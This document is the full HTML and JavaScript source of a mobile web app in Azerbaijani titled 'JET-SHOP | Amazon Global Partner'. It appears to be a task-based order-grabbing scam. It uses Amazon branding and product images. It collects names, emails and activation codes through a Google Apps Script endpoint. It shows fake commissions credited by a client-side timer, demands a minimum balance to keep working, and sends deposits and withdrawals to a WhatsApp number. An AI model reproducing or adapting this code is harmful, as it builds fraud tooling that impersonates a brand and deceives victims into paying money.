<!DOCTYPE html>
<html lang="az">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#f3f4f6">
    <title>JET-SHOP | Amazon Global Partner</title>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --primary: #ff9900; --secondary: #232f3e; --success: #00b894; --bg: #f3f4f6; --white: #ffffff; --text: #2d3436; }
        * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
        body { margin: 0; padding: 0; background: var(--bg); color: var(--text); font-family: 'Poppins', sans-serif; overflow-x: hidden; }
        #authScreen { position: fixed; inset: 0; z-index: 9999; background: var(--white); display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
        .auth-logo { width: 150px; margin-bottom: 20px; }
        .auth-inp { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #dfe6e9; border-radius: 10px; font-size: 16px; text-align: center; }
        .btn-login { width: 100%; padding: 15px; background: var(--primary); color: var(--white); border: none; border-radius: 10px; font-weight: 700; font-size: 18px; cursor: pointer; }
        header { background: var(--secondary); color: white; padding: 15px; position: sticky; top: 0; z-index: 100; display: flex; justify-content: space-between; align-items: center; }
        .logo-text { font-weight: 700; font-size: 20px; color: var(--primary); }
        .bal-card { background: rgba(255,255,255,0.1); padding: 5px 12px; border-radius: 20px; font-size: 14px; }
        .view { display: none; padding: 15px; padding-bottom: 100px; }
        .view.active { display: block; }
        .banner-home { width: 100%; height: 160px; background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://m.media-amazon.com/images/G/01/sell/images/prime-day/recirc/PS23_PrimeDay_The_Lowdown_v2_1x.jpg') center/cover; border-radius: 15px; display: flex; flex-direction: column; justify-content: center; padding: 20px; color: white; margin-bottom: 20px; }
        .vip-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }
        .vip-card { background: var(--white); border-radius: 15px; padding: 15px; text-align: center; border: 1px solid #eee; box-shadow: 0 4px 6px rgba(0,0,0,0.05); cursor: pointer; }
        .grab-stats { background: var(--secondary); color: white; padding: 20px; border-radius: 15px; display: flex; justify-content: space-between; margin-bottom: 20px; }
        .stat-item { text-align: center; }
        .stat-item span { display: block; font-size: 12px; opacity: 0.7; }
        .product-card { background: white; border-radius: 15px; padding: 20px; text-align: center; }
        .prod-img { width: 140px; height: 140px; object-fit: contain; margin-bottom: 15px; }
        .btn-grab { width: 100%; padding: 18px; background: var(--primary); border: none; border-radius: 12px; color: white; font-weight: 700; font-size: 18px; margin-top: 15px; }
        .navbar { position: fixed; bottom: 0; width: 100%; height: 70px; background: var(--white); border-top: 1px solid #eee; display: flex; justify-content: space-around; align-items: center; z-index: 100; }
        .nav-item { display: flex; flex-direction: column; align-items: center; color: #b2bec3; font-size: 11px; font-weight: 600; cursor: pointer; }
        .nav-item.active { color: var(--primary); }
        #grabModal { position: fixed; inset: 0; background: rgba(0,0,0,0.8); z-index: 1000; display: none; align-items: center; justify-content: center; padding: 20px; }
        .modal-content { background: white; padding: 25px; border-radius: 20px; width: 100%; max-width: 320px; text-align: center; }
    </style>
</head>
<body>

    <div id="authScreen">
        <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" class="auth-logo">
        <div class="auth-box">
            <input type="text" id="rName" class="auth-inp" placeholder="Adınız">
            <input type="email" id="rEmail" class="auth-inp" placeholder="Email">
            <input type="text" id="rCode" class="auth-inp" placeholder="Aktivasiya Kodu">
            <button class="btn-login" id="loginBtn" onclick="handleLogin()">DAXİL OL</button>
        </div>
    </div>

    <div id="appScreen" style="display:none;">
        <header>
            <div class="logo-text">JET-SHOP</div>
            <div class="bal-card">Balans: <b id="balVal">$0.00</b></div>
        </header>

        <div id="v-home" class="view active">
            <div class="banner-home"><h2>Amazon Partner</h2><p>Günlük tapşırıqlar, yüksək gəlir.</p></div>
            <div class="vip-grid">
                <div class="vip-card" onclick="nav('grab')"><img src="https://cdn-icons-png.flaticon.com/512/732/732190.png" width="40"><br><h3>Amazon VIP 1</h3><p>Limit: 5 Sifariş</p><b style="color:var(--primary)">AKTİVDİR</b></div>
                <div class="vip-card" style="opacity:0.6" onclick="alert('Balansınız $100 olmalıdır')"><img src="https://cdn-icons-png.flaticon.com/512/732/732190.png" width="40"><br><h3>Alibaba VIP 2</h3><p>Limit: 10 Sifariş</p><b>KİLİDLİ</b></div>
            </div>
        </div>

        <div id="v-grab" class="view">
            <div class="grab-stats">
                <div class="stat-item"><span>Bugünlük</span><b id="todayEarn">$0.00</b></div>
                <div class="stat-item"><span>Tamamlanıb</span><b id="taskCount">0 / 5</b></div>
            </div>
            <div class="product-card">
                <img id="prodImg" src="https://m.media-amazon.com/images/I/71jG+e7roXL._AC_SL1500_.jpg" class="prod-img">
                <h3 id="prodTitle" style="font-size:16px;">Yüklənir...</h3>
                <p id="prodPrice" style="color:var(--primary); font-weight:700; font-size:20px;">$0.00</p>
                <button class="btn-grab" id="grabBtn" onclick="processOrder()">SİFARİŞİ TƏSDİQLƏ</button>
            </div>
        </div>

        <div id="v-profile" class="view">
            <div style="background:white; padding:20px; border-radius:15px; text-align:center; margin-bottom:20px;">
                <div style="width:70px; height:70px; background:#eee; border-radius:50%; display:flex; align-items:center; justify-content:center; margin:0 auto 10px; font-size:30px;"><i class="fa-solid fa-user"></i></div>
                <h3 id="userName" style="margin:0;">İstifadəçi</h3>
                <p id="userEmail" style="margin:0; font-size:12px; color:#888;"></p>
            </div>
            <button class="btn-login" style="background:var(--success); margin-bottom:10px;" onclick="wa('Sifariş üçün balans artırmaq istəyirəm')">DEPОZİT</button>
            <button class="btn-login" style="background:var(--secondary)" onclick="withdraw()">PULU ÇƏK</button>
        </div>

        <nav class="navbar">
            <div class="nav-item active" id="n-home" onclick="nav('home')"><i class="fa-solid fa-house"></i><span>Home</span></div>
            <div class="nav-item" id="n-grab" onclick="nav('grab')"><i class="fa-solid fa-hand-pointer"></i><span>Grab</span></div>
            <div class="nav-item" id="n-profile" onclick="nav('profile')"><i class="fa-solid fa-circle-user"></i><span>Profil</span></div>
        </nav>
    </div>

    <div id="grabModal">
        <div class="modal-content">
            <div id="modalLoading">
                <i class="fa-solid fa-circle-notch fa-spin" style="font-size:40px; color:var(--primary);"></i>
                <p>Məhsul yoxlanılır...</p>
            </div>
            <div id="modalSuccess" style="display:none;">
                <i class="fa-solid fa-circle-check" style="font-size:40px; color:var(--success);"></i>
                <h3>Uğurlu!</h3>
                <p>Komissiya balansınıza əlavə edildi.</p>
                <button class="btn-login" onclick="closeModal()">DAVAM ET</button>
            </div>
        </div>
    </div>

    <script>
        const API = "https://script.google.com/macros/s/AKfycbwxptBKZ9pDn_HkmR8MAsWtkf73Q0c971ClR6JrpQPWyC0NitfN7uBmjl0F1A3fWW6c/exec";
        const WA_NUM = "994507516137";
        let user = { name: "", email: "", balance: 0, deposit: 0, tasks: 0, todayEarn: 0 };
        const prods = [
            { t: "Apple iPhone 15 Pro", i: "https://m.media-amazon.com/images/I/81SigAnN7pL._AC_SL1500_.jpg", p: 1099, c: 2.50 },
            { t: "Samsung S24 Ultra", i: "https://m.media-amazon.com/images/I/71RVuSReZAL._AC_SL1500_.jpg", p: 1299, c: 3.10 },
            { t: "Sony PlayStation 5", i: "https://m.media-amazon.com/images/I/5105XzkoqQL._AC_SL1500_.jpg", p: 499, c: 1.80 },
            { t: "iPad Pro M2", i: "https://m.media-amazon.com/images/I/81gC7frWXYL._AC_SL1500_.jpg", p: 899, c: 2.20 }
        ];

        window.onload = () => { if(localStorage.getItem('js_final_data')) { user = JSON.parse(localStorage.getItem('js_final_data')); showApp(); } };
        function wa(t) { window.location.href = `https://wa.me/${WA_NUM}?text=${encodeURIComponent(t)}`; }

        async function handleLogin() {
            let n = document.getElementById('rName').value, e = document.getElementById('rEmail').value, c = document.getElementById('rCode').value;
            if(!n || !e || !c) return alert("Bütün xanaları doldurun");
            document.getElementById('loginBtn').innerText = "Yoxlanılır...";
            try {
                let res = await fetch(`${API}?action=login&name=${encodeURIComponent(n)}&email=${encodeURIComponent(e)}&code=${encodeURIComponent(c)}`);
                let data = await res.json();
                if(data.result === 'success') {
                    user = { name: n, email: e, balance: parseFloat(data.balance), deposit: parseFloat(data.balance), tasks: 0, todayEarn: 0 };
                    save(); showApp();
                } else alert(data.msg);
            } catch(x) { alert("Xəta! Yenidən yoxlayın."); }
            document.getElementById('loginBtn').innerText = "DAXİL OL";
        }

        function showApp() {
            document.getElementById('authScreen').style.display = 'none';
            document.getElementById('appScreen').style.display = 'block';
            document.getElementById('userName').innerText = user.name;
            document.getElementById('userEmail').innerText = user.email;
            updateUI();
        }

        function updateUI() {
            document.getElementById('balVal').innerText = `$${user.balance.toFixed(2)}`;
            document.getElementById('taskCount').innerText = `${user.tasks} / 5`;
            document.getElementById('todayEarn').innerText = `$${user.todayEarn.toFixed(2)}`;
            save();
        }

        function nav(p) {
            document.querySelectorAll('.view').forEach(v => v.classList.remove('active'));
            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
            document.getElementById('v-' + p).classList.add('active');
            document.getElementById('n-' + p).classList.add('active');
            if(p === 'grab') loadProd();
        }

        function loadProd() {
            let pr = prods[Math.floor(Math.random() * prods.length)];
            document.getElementById('prodImg').src = pr.i;
            document.getElementById('prodTitle').innerText = pr.t;
            document.getElementById('prodPrice').innerText = `$${pr.p}`;
            user.currentComm = pr.c;
        }

        async function processOrder() {
            if(user.tasks >= 5) return alert("Bugünlük limit bitib. Sabah yenidən cəhd edin.");
            if(user.balance < 5) return wa("Sifariş üçün balansınız ən az $5 olmalıdır. Artırmaq istəyirəm.");
            
            document.getElementById('grabModal').style.display = 'flex';
            document.getElementById('modalLoading').style.display = 'block';
            document.getElementById('modalSuccess').style.display = 'none';

            setTimeout(async () => {
                user.tasks++;
                user.balance += user.currentComm;
                user.todayEarn += user.currentComm;
                updateUI();
                
                // Backend Sync
                fetch(`${API}?action=updateBal&email=${user.email}&newBalance=${user.balance.toFixed(2)}`, {mode:'no-cors'});
                
                document.getElementById('modalLoading').style.display = 'none';
                document.getElementById('modalSuccess').style.display = 'block';
            }, 2000);
        }

        function closeModal() { document.getElementById('grabModal').style.display = 'none'; loadProd(); }
        function withdraw() { if(user.balance > user.deposit) wa(`ID: ${user.email}. Balansım: $${user.balance.toFixed(2)}. Pulu çəkmək istəyirəm.`); else alert("Çıxarış üçün ən azı 1 tapşırıq tamamlamalısınız."); }
        function save() { localStorage.setItem('js_final_data', JSON.stringify(user)); }
    </script>
</body>
</html>
